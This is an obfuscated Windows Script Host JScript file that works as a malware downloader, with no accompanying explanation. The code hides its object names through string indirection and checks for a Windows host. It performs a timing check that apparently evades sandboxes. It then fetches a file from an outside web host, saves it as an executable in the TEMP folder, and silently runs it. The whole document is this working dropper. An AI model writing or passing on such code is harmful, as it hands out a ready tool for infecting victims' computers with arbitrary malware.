var SB = false;
var Ly = "CreateObject";
var o = function s() {return WScript[Ly]("WScript.Shell");}(), ha = 11;
var l = "MSXML2.XMLHTTP";
var V = 2123213;
var M = 0;
function fK(PR){o["Run"](PR, M, M);};
function Bb(){return "" + l;};
function Xs(k, w){M = M * 1; return k - w;};
function Gc(){return Ly;};
/*@cc_on
  @if (@_win32 || @_win64)
    SB = true;
  @end
@*/
if (SB)
{
var Qb = "";
function O(){return 22;};
var RP = 0; var sD = 0;
function iG()
{
var P = new this["Date"]();
var BV = P["getUTCMilliseconds"]();
WScript["Sleep"](O());
var P = new this["Date"]();
var M0 = P["getUTCMilliseconds"]();
WScript["Sleep"](O());
var P = new this["Date"]();
var R = P["getUTCMilliseconds"]();
var RP = "Yc";
RP = Xs(M0, BV);
var sD = "Iw";
sD = Xs(R, M0);
Qb = "open";
return Xs(RP, sD);
}
var j = false;
var j0 = false;
for (var OS = M; OS < O() * 1; OS++){if (iG() != M){
j = true; 
sD = "31" + 11 * RP + sD; 
j0 = true; 
break;
}}
function E() {return ((j == true) && (j == j0)) ? 1 : M;};
if (j && E() && j0){
function vN() {return o["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "75WlzRfM.exe";};
 V0 = Bb();
 Gr = WScript[Ly](V0);
 var eI = 1;
 while (eI){
try {
Gr[Qb]("GET", "http://hiddenhandbags.com/kdk4a", false);
Gr["send"]();
y = "Sleep";
for (;;){WScript[y](O() * 11); if (Gr["readystate"] >= 2 * 2) break;};
eI = M;
} catch(u){};
}
function J(s0) {var Nn = (1, 2, 3, 4, 5, s0); return Nn;};
A = WScript[Gc()]("ADODB.Stream");
V0 = A;
V0[Qb]();
V0["type"] = J(1);
V0["write"](Gr["ResponseBody"]);
A["position"] = J(M);
V0["Save" + "ToFile"](vN(), 2);
A["c"+"lose"]();
U = vN();
fK(U);
}
}

